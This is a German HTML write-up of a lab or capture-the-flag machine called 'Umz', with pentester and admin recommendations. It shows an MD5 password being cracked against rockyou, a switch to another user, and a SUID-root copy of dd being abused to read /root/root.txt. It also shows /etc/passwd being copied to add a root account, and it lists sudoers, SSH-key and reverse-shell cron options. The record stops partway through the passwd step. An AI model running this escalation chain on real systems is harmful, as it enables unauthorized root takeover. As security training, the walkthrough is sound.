+Dies demonstriert, wie schnell MD5-Hashes (besonders von Passwörtern aus gängigen Wortlisten) geknackt werden können. Verwenden Sie MD5 niemals zum Speichern von Passwörtern. Setzen Sie auf moderne, starke, gesaltete Hashing-Verfahren (Argon2, scrypt, bcrypt). Wenn die Datei `umz.pass` tatsächlich ein Passwort enthielt, das mit einem einfachen `echo password > umz.pass` erstellt wurde, dann ist die Annahme des angehängten Newlines korrekt.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 md5cracker.py</span></div>
+        <pre>
+Starte Hash-Vergleich mit Wordlist: /usr/share/wordlists/rockyou.txt
+Ziel-Hash: a963fadd7fd379f9bc294ad0ba44f659 (erwartet von 'Passwort\n')
+Verarbeitet: 500000 Wörter... Rate: 1103584 W/s
+Verarbeitet: 1000000 Wörter... Rate: 1128290 W/s
+...
+..
+.
+**************************************************
+<span class="password">PASSWORT GEFUNDEN nach 1290 Versuchen!</span>
+Passwort (ohne das angehängte \n): <span class="password">sunshine3</span>
+Gehasht wurde: 'sunshine3\n'
+Erzeugter Hash: a963fadd7fd379f9bc294ad0ba44f659 
+**************************************************
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich führe das zuvor erstellte Python-Skript `md5cracker.py` auf meinem lokalen System aus.
+Das Skript beginnt, die `rockyou.txt`-Wortliste zu verarbeiten und die MD5-Hashes (mit angehängtem Newline) zu vergleichen.
+Nach nur 1290 Versuchen meldet das Skript einen Erfolg:
+- Das gefundene Passwort (ohne das Newline) ist `sunshine3`.
+- Es bestätigt, dass der Hash von `'sunshine3\n'` mit dem Ziel-Hash `a963fadd7fd379f9bc294ad0ba44f659` übereinstimmt.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Hervorragend! Der MD5-Hash wurde erfolgreich und sehr schnell geknackt. Das Passwort `sunshine3` ist relativ einfach und in gängigen Wortlisten wie `rockyou.txt` enthalten. Die Annahme, dass ein Newline-Zeichen (`\n`) Teil des gehashten Inhalts war, hat sich als korrekt erwiesen. Dieses Passwort gehört mit hoher Wahrscheinlichkeit zum Benutzer `umzyyds`, da die Datei `umz.pass` im Kontext dieses Benutzers oder des Systems "Umz" benannt wurde.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Versuchen Sie nun, sich mit dem gefundenen Passwort `sunshine3` als Benutzer `umzyyds` auf dem Zielsystem anzumelden. Dies kann entweder über SSH geschehen (falls `umzyyds` SSH-Zugriff mit Passwort hat) oder über den `su umzyyds`-Befehl in der bestehenden Shell des Benutzers `welcome`.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Dies unterstreicht erneut die Schwäche von MD5 und die Notwendigkeit, starke, einzigartige Passwörter zu verwenden, die nicht in gängigen Wortlisten vorkommen. Implementieren Sie Passwortrichtlinien, die eine Mindestkomplexität und -länge erfordern und die Verwendung von Wörterbuchwörtern verbieten. Schulen Sie Benutzer im sicheren Umgang mit Passwörtern.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">ls ..</span></div>
+        <pre>
+umzyyds  welcome
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">welcome@Umz:~$ <span class="command">su umzyyds</span></div>
+        <pre>
+Password: <span class="command">sunshine3</span> 
+<span class="password">umzyyds@Umz:/home/welcome$</span> <span class="command">id</span>
+<span class="command">uid=1001(umzyyds) gid=1001(umzyyds) groups=1001(umzyyds)</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Zurück auf dem Zielsystem in der Shell des Benutzers `welcome`:
+1.  `ls ..`: Bestätigt erneut die Existenz des Home-Verzeichnisses `umzyyds`.
+2.  `su umzyyds`: Ich versuche, zum Benutzer `umzyyds` zu wechseln.
+3.  `Password: sunshine3`: Ich gebe das zuvor geknackte Passwort `sunshine3` ein.
+4.  Der Prompt wechselt zu `umzyyds@Umz:/home/welcome$`, was anzeigt, dass der Benutzerwechsel erfolgreich war. Das aktuelle Verzeichnis ist noch das Home-Verzeichnis von `welcome`.
+5.  `id`: Der `id`-Befehl bestätigt, dass ich nun als Benutzer `umzyyds` (UID 1001, GID 1001) agiere.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Perfekt! Das geknackte Passwort `sunshine3` war korrekt für den Benutzer `umzyyds`. Ich habe nun die Kontrolle über den Account dieses Benutzers erlangt. Dies ist ein weiterer wichtiger Schritt in Richtung Root-Privilegien, da `umzyyds` möglicherweise andere Berechtigungen oder Zugriff auf andere Dateien hat als `welcome`.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nachdem Sie als `umzyyds` agieren, führen Sie erneut eine Enumerationsphase durch, die spezifisch für diesen Benutzer ist:
+- `sudo -l` (um die Sudo-Rechte von `umzyyds` zu prüfen).
+- Überprüfen Sie das Home-Verzeichnis von `umzyyds` (`cd ~; ls -la`).
+- Suchen Sie nach Cronjobs, die als `umzyyds` laufen.
+- Überprüfen Sie Gruppenmitgliedschaften und deren Auswirkungen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass Passwörter für alle Benutzerkonten stark und einzigartig sind. Überwachen Sie fehlgeschlagene und erfolgreiche `su`-Versuche. Implementieren Sie das Prinzip der geringsten Rechte auch für Benutzerkonten; nicht jeder Benutzer benötigt die gleichen Berechtigungen oder Zugriffsmöglichkeiten.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:/home/welcome$ <span class="command">sudo -l</span></div>
+        <pre>
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for umzyyds: <span class="command">sunshine3</span> 
+<span class="password">Sorry, user umzyyds may not run sudo on Umz.</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Als Benutzer `umzyyds` versuche ich mit `sudo -l` meine `sudo`-Berechtigungen zu überprüfen.
+Das System zeigt zuerst die Standard-`sudo`-Nachricht an.
+Anschließend werde ich nach dem Passwort für `umzyyds` gefragt: `[sudo] password for umzyyds:`. Ich gebe `sunshine3` ein.
+Die Antwort ist: `Sorry, user umzyyds may not run sudo on Umz.`
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dies bedeutet, dass der Benutzer `umzyyds` keine konfigurierten `sudo`-Berechtigungen hat. Er darf keine Befehle als andere Benutzer (insbesondere nicht als `root`) über `sudo` ausführen. Der Versuch, `sudo -l` auszuführen, erfordert dennoch die Eingabe des Benutzerpassworts, um die Anfrage zu authentifizieren, bevor die (nicht vorhandenen) Regeln angezeigt werden.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Da `sudo` für `umzyyds` keine Option ist, müssen andere Wege zur Privilegienerweiterung gesucht werden. Konzentrieren Sie sich auf die Enumeration des Home-Verzeichnisses von `umzyyds`, suchen Sie nach SUID/SGID-Binaries, die möglicherweise von diesem Benutzer ausgenutzt werden können, Kernel-Exploits oder schlecht konfigurierten Diensten/Cronjobs, die im Kontext von `root` oder einem anderen privilegierten Benutzer laufen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Es ist eine gute Sicherheitspraxis, Benutzern nur dann `sudo`-Rechte zu gewähren, wenn diese absolut notwendig sind. Dass `umzyyds` hier keine `sudo`-Rechte hat, ist aus dieser Perspektive positiv.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:/home/welcome$ <span class="command">cd ~</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">ls -la</span></div>
+        <pre>
+total 96
+drwx------ 2 umzyyds umzyyds  4096 May  3 10:42 .
+drwxr-xr-x 4 root    root     4096 May  3 10:27 ..
+lrwxrwxrwx 1 root    root        9 May  3 10:38 .bash_history -> /dev/null
+-rw-r--r-- 1 umzyyds umzyyds   220 May  3 10:27 .bash_logout
+-rw-r--r-- 1 umzyyds umzyyds  3526 May  3 10:27 .bashrc
+<span class="command">-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi</span>
+-rw-r--r-- 1 umzyyds umzyyds   807 May  3 10:27 .profile
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+1.  `cd ~`: Ich wechsle in das Home-Verzeichnis des aktuellen Benutzers (`umzyyds`).
+2.  `ls -la`: Ich lasse den Inhalt des Home-Verzeichnisses von `umzyyds` detailliert auflisten.
+
+Die Ausgabe zeigt die üblichen Konfigurationsdateien (`.bash_logout`, `.bashrc`, `.profile`).
+Der interessanteste Fund ist jedoch die Datei `Dashazi`:
+- Sie gehört dem Benutzer `root` und der Gruppe `root`.
+- Sie hat sowohl das SUID-Bit (`s` bei den Benutzerrechten, `rws`) als auch das SGID-Bit (`s` bei den Gruppenrechten, `r-s`) gesetzt. Dies bedeutet, dass die Datei beim Ausführen mit den Rechten von `root` (Benutzer) und `root` (Gruppe) läuft, unabhängig davon, welcher Benutzer sie startet.
+- Sie ist für alle ausführbar (`x` bei den "others"-Rechten).
+- Die Größe beträgt 76712 Bytes.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das ist ein extrem vielversprechender Fund! Eine ausführbare Datei mit SUID- und SGID-Root-Rechten im Home-Verzeichnis eines normalen Benutzers ist ein starker Indikator für einen potenziellen Privilegien-Eskalationsvektor. Wenn diese Datei `Dashazi` eine Funktion enthält, die missbraucht werden kann (z.B. das Ausführen von Befehlen, Schreiben in beliebige Dateien als Root), dann ist dies der Weg zu Root. Die anderen Dateien sind Standard.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die Datei `Dashazi` muss sofort genauer untersucht werden:
+- Führen Sie `file Dashazi` aus, um den Dateityp zu bestimmen (wahrscheinlich ein ELF Executable).
+- Versuchen Sie, `./Dashazi` auszuführen und beobachten Sie das Verhalten. Gibt es Hilfeoptionen (`./Dashazi --help`, `./Dashazi -h`)?
+- Wenn es sich um ein bekanntes Linux-Utility handelt, das umbenannt wurde, prüfen Sie auf GTFOBins nach SUID-Exploits für dieses Utility.
+- Wenn es ein benutzerdefiniertes Programm ist, verwenden Sie Tools wie `strings`, `ltrace`, `strace` oder einen Decompiler/Disassembler (wie Ghidra, IDA), um seine Funktionsweise zu verstehen und Schwachstellen zu finden. Das Ziel ist es, eine Funktion zu finden, die es ermöglicht, Root-Rechte zu erlangen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Dateien mit SUID/SGID-Root-Rechten sollten niemals in Benutzer-Home-Verzeichnissen abgelegt werden und nur dann existieren, wenn sie absolut notwendig sind und von vertrauenswürdigen Systempaketen stammen. Überprüfen Sie den Zweck dieser Datei `Dashazi`. Wenn sie nicht für einen legitimen Systemdienst benötigt wird oder eine unsichere Funktionalität bietet, entfernen Sie sie oder zumindest die SUID/SGID-Bits (`chmod u-s,g-s Dashazi`). Überwachen Sie das System regelmäßig auf verdächtige SUID/SGID-Dateien.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">file Dashazi</span></div>
+        <pre>
+Dashazi: <span class="command">setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=21bfd63cfb732f9c09d17921f8eef619429bcd35, stripped</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Der Befehl `file Dashazi` wird ausgeführt, um den Typ der Datei `Dashazi` zu bestimmen.
+Die Ausgabe bestätigt:
+- `setuid, setgid`: Das SUID- und SGID-Bit sind gesetzt.
+- `ELF 64-bit LSB pie executable, x86-64`: Es handelt sich um eine 64-Bit-Linux-Binärdatei (Executable and Linkable Format), die als Position Independent Executable (PIE) kompiliert wurde.
+- `dynamically linked`: Sie verwendet Shared Libraries.
+- `interpreter /lib64/ld-linux-x86-64.so.2`: Der dynamische Linker.
+- `stripped`: Die Debugging-Symbole wurden aus der Datei entfernt, was die Reverse-Engineering-Analyse erschwert.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Ausgabe von `file` bestätigt die kritischen Eigenschaften von `Dashazi`, insbesondere SUID/SGID und dass es sich um eine ausführbare Datei handelt. Dass sie "stripped" ist, bedeutet, dass die Analyse des Programms ohne Debug-Symbole erfolgen muss, was anspruchsvoller ist, aber nicht unmöglich.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Da die Datei "stripped" ist, wird eine statische Analyse mit Tools wie `strings` immer noch nützlich sein, um nach eingebetteten Zeichenketten (Dateipfade, Fehlermeldungen, Hilfetexte) zu suchen. Eine dynamische Analyse mit `ltrace` (um Bibliotheksaufrufe zu verfolgen) und `strace` (um Systemaufrufe zu verfolgen) beim Ausführen von `./Dashazi` mit verschiedenen (oder keinen) Argumenten kann Aufschluss über die Funktionsweise geben. Da der Name "Dashazi" nicht auf ein Standard-Linux-Tool hindeutet, ist es wahrscheinlich ein Custom Binary oder ein umbenanntes Tool.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wie zuvor: Untersuchen Sie den Ursprung und Zweck dieser Datei. Wenn sie nicht Teil eines vertrauenswürdigen Pakets ist oder eine bekannte sichere Funktion hat, sollte sie entfernt oder ihre Berechtigungen drastisch reduziert werden.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">./Dashazi</span></div>
+        <pre>
+h
+id
+ls
+^C0+3 records in
+0+0 records out
+0 bytes copied, 11.1055 s, 0.0 kB/s
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich führe die SUID/SGID-Datei `./Dashazi` ohne Argumente aus.
+Das Programm scheint auf eine Eingabe zu warten. Ich tippe `h`, dann `id`, dann `ls`. Diese Eingaben scheinen keine direkte sichtbare Reaktion im Sinne einer Befehlsausführung oder einer Hilfeanzeige zu erzeugen.
+Schließlich breche ich das Programm mit `Strg+C` (`^C`) ab.
+Nach dem Abbruch erscheint eine Ausgabe, die stark an die Standardausgabe des `dd`-Befehls erinnert: `0+3 records in`, `0+0 records out`, `0 bytes copied...`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das Verhalten und insbesondere die Ausgabe nach dem Abbruch legen die Vermutung sehr nahe, dass `Dashazi` eine Kopie oder eine modifizierte Version des Standard-Linux-Tools `dd` ist. `dd` wird verwendet, um Daten zu kopieren und zu konvertieren. Wenn `dd` als SUID root läuft, kann es missbraucht werden, um beliebige Dateien zu lesen oder zu schreiben, was zu einer vollständigen Kompromittierung des Systems führen kann. Die Eingaben `h`, `id`, `ls` wurden wahrscheinlich als Teil der Standardeingabe interpretiert, die `dd` (wenn keine `if=` Option gegeben ist) von `stdin` liest.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Die Hypothese, dass `Dashazi` `dd` ist, muss überprüft werden. Versuchen Sie, typische `dd`-Hilfeoptionen wie `./Dashazi --help` oder `./Dashazi --version` auszuführen. Wenn es sich tatsächlich um `dd` handelt, konsultieren Sie GTFOBins für `dd` SUID Exploits. Typischerweise kann man mit `dd if=/path/to/source of=/path/to/destination` Dateien kopieren. Wenn `Dashazi` `dd` ist und SUID root läuft, könnte man z.B. `/etc/shadow` in ein lesbares Verzeichnis kopieren oder eine Datei mit Root-Rechten überschreiben (z.B. `/etc/passwd`, `/etc/sudoers` oder eine `authorized_keys`-Datei).
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wenn `Dashazi` tatsächlich `dd` ist und SUID/SGID root gesetzt hat, ist dies eine massive Sicherheitslücke. Die SUID/SGID-Bits müssen sofort von dieser Datei entfernt werden (`chmod u-s,g-s Dashazi`). Es gibt selten einen legitimen Grund, `dd` SUID root laufen zu lassen, da dies fast immer zu einer Privilegienerweiterung missbraucht werden kann.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">./Dashazi --h</span></div>
+        <pre>
+Usage: ./Dashazi [OPERAND]...
+  or:  ./Dashazi OPTION
+Copy a file, converting and formatting according to the operands.
+
+  bs=BYTES        read and write up to BYTES bytes at a time (default: 512);
+                  overrides ibs and obs
+  cbs=BYTES       convert BYTES bytes at a time
+  conv=CONVS      convert the file as per the comma separated symbol list
+  count=N         copy only N input blocks
+  ibs=BYTES       read up to BYTES bytes at a time (default: 512)
+  if=FILE         read from FILE instead of stdin
+  iflag=FLAGS     read as per the comma separated symbol list
+  obs=BYTES       write BYTES bytes at a time (default: 512)
+  of=FILE         write to FILE instead of stdout
+  oflag=FLAGS     write as per the comma separated symbol list
+  seek=N          skip N obs-sized blocks at start of output
+  skip=N          skip N ibs-sized blocks at start of input
+  status=LEVEL    The LEVEL of information to print to stderr;
+                  'none' suppresses everything but error messages,
+                  'noxfer' suppresses the final transfer statistics,
+                  'progress' shows periodic transfer statistics
+
+N and BYTES may be followed by the following multiplicative suffixes:
+c =1, w =2, b =512, kB =1000, K =1024, MB =1000*1000, M =1024*1024, xM =M,
+GB =1000*1000*1000, G =1024*1024*1024, and so on for T, P, E, Z, Y.
+
+Each CONV symbol may be:
+
+  ascii     from EBCDIC to ASCII
+  ebcdic    from ASCII to EBCDIC
+  ibm       from ASCII to alternate EBCDIC
+  block     pad newline-terminated records with spaces to cbs-size
+  unblock   replace trailing spaces in cbs-size records with newline
+  lcase     change upper case to lower case
+  ucase     change lower case to upper case
+  sparse    try to seek rather than write the output for NUL input blocks
+  swab      swap every pair of input bytes
+  sync      pad every input block with NULs to ibs-size; when used
+            with block or unblock, pad with spaces rather than NULs
+  excl      fail if the output file already exists
+  nocreat   do not create the output file
+  notrunc   do not truncate the output file
+  noerror   continue after read errors
+  fdatasync  physically write output file data before finishing
+  fsync     likewise, but also write metadata
+
+Each FLAG symbol may be:
+
+  append    append mode (makes sense only for output; conv=notrunc suggested)
+  direct    use direct I/O for data
+  directory  fail unless a directory
+  dsync     use synchronized I/O for data
+  sync      likewise, but also for metadata
+  fullblock  accumulate full blocks of input (iflag only)
+  nonblock  use non-blocking I/O
+  noatime   do not update access time
+  nocache   Request to drop cache.  See also oflag=sync
+  noctty    do not assign controlling terminal from file
+  nofollow  do not follow symlinks
+  count_bytes  treat 'count=N' as a byte count (iflag only)
+  skip_bytes  treat 'skip=N' as a byte count (iflag only)
+  seek_bytes  treat 'seek=N' as a byte count (oflag only)
+
+Sending a USR1 signal to a running 'dd' process makes it
+print I/O statistics to standard error and then resume copying.
+
+Options are:
+
+      --help     display this help and exit
+      --version  output version information and exit
+
+GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
+Full documentation at: <https://www.gnu.org/software/coreutils/dd>
+or available locally via: info '(coreutils) dd invocation'
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich führe `./Dashazi --h` aus, um zu sehen, ob es eine Hilfeoption gibt, die meiner Vermutung, dass es sich um `dd` handelt, widerspricht oder sie bestätigt. Die Option `--h` ist zwar nicht die Standard-Hilfeoption für die meisten GNU-Tools (das wäre `--help`), aber manche Programme akzeptieren auch kürzere Varianten.
+Die Ausgabe ist die vollständige, standardmäßige Manpage/Hilfeausgabe des `dd`-Befehls.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Damit ist es bestätigt: `Dashazi` ist tatsächlich eine Kopie des `dd`-Befehls. Da diese Kopie SUID und SGID root gesetzt hat, haben wir nun ein extrem mächtiges Werkzeug zur Hand, um mit Root-Rechten auf Dateiebene zu agieren. Dies ist ein klassischer und sehr effektiver Weg zur Privilegienerweiterung. Der Weg zu Root steht nun offen!
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Mit `dd` als Root können Sie nun verschiedene Aktionen durchführen:
+1.  **Lesen sensibler Dateien:** Kopieren Sie `/root/root.txt` oder `/etc/shadow` an einen Ort, an dem `umzyyds` Leserechte hat (z.B. `/tmp/`). Beispiel: `./Dashazi if=/root/root.txt of=/tmp/root_flag.txt bs=1M` (bs=1M ist nicht zwingend, aber üblich).
+2.  **Schreiben/Überschreiben von Dateien:**
+    *   Fügen Sie einen neuen Benutzer mit Root-Rechten zu `/etc/passwd` hinzu.
+    *   Überschreiben Sie `/etc/sudoers`, um `umzyyds` volle `sudo`-Rechte ohne Passwort zu geben.
+    *   Fügen Sie Ihren SSH-Schlüssel zu `/root/.ssh/authorized_keys` hinzu.
+    *   Erstellen Sie einen Cronjob, der als `root` läuft und eine Reverse Shell startet.
+Die Methode mit dem Überschreiben von `/etc/passwd` oder das Hinzufügen eines SSH-Keys zu Root sind oft die direktesten Wege.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Entfernen Sie sofort die SUID/SGID-Bits von `/home/umzyyds/Dashazi` (`chmod u-s,g-s /home/umzyyds/Dashazi`) oder löschen Sie die Datei, wenn sie nicht benötigt wird. Untersuchen Sie, wie diese Datei dorthin gelangt ist und warum sie diese gefährlichen Berechtigungen hatte. Überprüfen Sie das gesamte System auf andere Instanzen von Standard-Tools, die umbenannt und mit SUID/SGID-Bits versehen wurden.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">./Dashazi if=/bin/bash of=/tmp/rootbash bs=1M</span></div>
+        <pre>
+1+1 records in
+1+1 records out
+1168776 bytes (1.2 MB, 1.1 MiB) copied, 0.00152619 s, 766 MB/s
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">ls -la /tmp/rootbash</span></div>
+        <pre>
+-rw-r--r-- 1 <span class="command">root root</span> 1168776 Jun  3 11:42 /tmp/rootbash
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">chmod u+s /tmp/rootbash</span></div>
+        <pre>
+chmod: changing permissions of '/tmp/rootbash': <span class="password">Operation not permitted</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich versuche hier eine gängige Methode zur Privilegienerweiterung mit einem SUID-fähigen `dd`:
+1.  `./Dashazi if=/bin/bash of=/tmp/rootbash bs=1M`: Ich kopiere die `/bin/bash`-Executable nach `/tmp/rootbash`. Da `Dashazi` (als `dd`) mit Root-Rechten läuft, wird die neue Datei `/tmp/rootbash` ebenfalls `root` als Eigentümer haben.
+2.  `ls -la /tmp/rootbash`: Bestätigt, dass `/tmp/rootbash` erstellt wurde und `root:root` gehört. Die Berechtigungen sind standardmäßig `-rw-r--r--`.
+3.  `chmod u+s /tmp/rootbash`: Ich versuche, das SUID-Bit auf dieser Kopie der Bash-Shell zu setzen. Wenn dies gelänge und die Datei `root` gehört, würde das Ausführen von `/tmp/rootbash` eine Root-Shell starten.
+    Dieser Befehl schlägt jedoch fehl mit `chmod: changing permissions of '/tmp/rootbash': Operation not permitted`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der Versuch, das SUID-Bit auf `/tmp/rootbash` zu setzen, schlägt fehl, weil der Benutzer `umzyyds` (der `chmod` ausführt) nicht der Eigentümer der Datei ist (Eigentümer ist `root`) und auch nicht `root` selbst ist. Nur der Eigentümer einer Datei oder `root` kann das SUID-Bit setzen.
+Dieser spezielle Weg zur Root-Shell funktioniert hier also nicht direkt, da `dd` zwar die Datei als `root` erstellen kann, aber `umzyyds` nicht die Berechtigungen ändern kann. Der `dd`-Befehl selbst setzt nicht automatisch das SUID-Bit auf die Zieldatei.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Dieser Ansatz war einen Versuch wert, ist aber in dieser Form nicht erfolgreich. Es gibt andere, direktere Wege, `dd` als SUID root auszunutzen:
+- Direkter Lesezugriff auf die Root-Flag: `./Dashazi if=/root/root.txt of=/tmp/flag.txt` und dann `cat /tmp/flag.txt`.
+- Modifikation kritischer Systemdateien:
+    - Einen neuen Root-Benutzer zu `/etc/passwd` hinzufügen (erfordert das Erstellen einer modifizierten `passwd`-Datei und das Zurückkopieren mit `dd`).
+    - `umzyyds` volle `sudo`-Rechte in `/etc/sudoers` geben.
+    - Den eigenen SSH-Schlüssel zu `/root/.ssh/authorized_keys` hinzufügen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Die Tatsache, dass `umzyyds` das SUID-Bit nicht setzen konnte, ist eine normale Systemeinschränkung. Das eigentliche Problem bleibt die SUID-Root-`dd`-Kopie (`Dashazi`).
+</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Root)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong>
+            Die Schwachstelle liegt in der Datei <code>/home/umzyyds/Dashazi</code>, bei der es sich um eine Kopie des <code>dd</code>-Befehls handelt, die mit SUID- und SGID-Root-Rechten ausgestattet ist. Dies erlaubt es einem niedrig privilegierten Benutzer (in diesem Fall <code>umzyyds</code>), Lese- und Schreiboperationen auf Dateiebene mit Root-Rechten durchzuführen. Dieser Proof of Concept demonstriert, wie diese Schwachstelle ausgenutzt werden kann, um den Inhalt der Root-Flag-Datei (<code>/root/root.txt</code>) zu lesen und um die Datei <code>/etc/passwd</code> zu modifizieren, um einen neuen Benutzer mit Root-Rechten hinzuzufügen, was zu einer vollständigen Übernahme des Systems führt.
+            </p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+            <ul>
+                <li>Zugriff als Benutzer <code>umzyyds</code> auf dem Zielsystem.</li>
+                <li>Existenz der SUID/SGID-Root-Datei <code>/home/umzyyds/Dashazi</code> (welche <code>dd</code> ist).</li>
+                <li>Grundlegende Kenntnisse der Linux-Kommandozeile.</li>
+            </ul>
+            </p>
+            <p class="recommendation"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+            <p class="analysis"><strong>Schritt 1: Lesen der Root-Flag</strong></p>
+            <p>Als Benutzer <code>umzyyds</code> verwenden wir <code>Dashazi</code> (dd), um den Inhalt von <code>/root/root.txt</code> in eine temporäre Datei zu kopieren, die wir dann lesen können.</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">./Dashazi if=/root/root.txt of=/tmp/root_flag.txt</span></div>
+        <pre>
+0+1 records in
+0+1 records out
+44 bytes copied, 0.00024483 s, 180 kB/s
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">cat /tmp/root_flag.txt</span></div>
+        <pre>
+<span class="password">flag{root-a73c45107081c08dd4560206b8ef8205}</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 1:</strong>
+Der erste Befehl `./Dashazi if=/root/root.txt of=/tmp/root_flag.txt` kopiert den Inhalt der Datei `/root/root.txt` (Input File, `if`) in die Datei `/tmp/root_flag.txt` (Output File, `of`). Da `Dashazi` mit Root-Rechten läuft, kann es `/root/root.txt` lesen. Die Datei `/tmp/root_flag.txt` wird ebenfalls als `root` erstellt, ist aber im `/tmp`-Verzeichnis für `umzyyds` lesbar.
+Der zweite Befehl `cat /tmp/root_flag.txt` gibt den Inhalt der kopierten Datei aus und enthüllt die Root-Flag.
+</p>
+<p class="evaluation"><strong>Bewertung Schritt 1:</strong>
+Dies demonstriert erfolgreich den unautorisierten Lesezugriff auf Dateien, die `root` gehören, und das Erbeuten der Root-Flag.
+</p>
+
+            <p class="analysis"><strong>Schritt 2: Vorbereiten einer modifizierten /etc/passwd Datei</strong></p>
+            <p>Wir erstellen einen Passwort-Hash für einen neuen Root-Benutzer (z.B. "dark" mit Passwort "toor"). Dann kopieren wir die aktuelle <code>/etc/passwd</code>, fügen unseren neuen Benutzer hinzu und bereiten sie für das Überschreiben vor.</p>
+
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">perl -le 'print crypt("toor", "aa")'</span></div>
+        <pre>
+aalIoK7SGUI2k
+        </pre>
+    </div>
+</div>
+<p class="analysis">Auf dem Angreifer-System (oder wenn `perl` auf dem Zielsystem vorhanden ist und `umzyyds` es nutzen kann) wird ein DES-basierter Hash für das Passwort "toor" mit dem Salt "aa" generiert. Das Ergebnis ist `aalIoK7SGUI2k`. Dieser Hash wird für den neuen Root-Benutzer in der `/etc/passwd`-Datei verwendet.
+</p>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">./Dashazi if=/etc/passwd of=/tmp/passwd.original status=none</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">cp /tmp/passwd.original /tmp/passwd.modified</span></div>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">umzyyds@Umz:~$ <span class="command">echo "dark:aalIoK7SGUI2k:0:0:SuperUser:/root:/bin/bash" >> /tmp/passwd.modified</span></div>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse Schritt 2:</strong>
+1.  `./Dashazi if=/etc/passwd of=/tmp/passwd.original status=none`: Die aktuelle `/etc/passwd` wird mit Root-Rechten nach `/tmp/passwd.original` kopiert.
+2.  `cp /tmp/passwd.original /tmp/passwd.modified`: Eine Arbeitskopie wird erstellt.
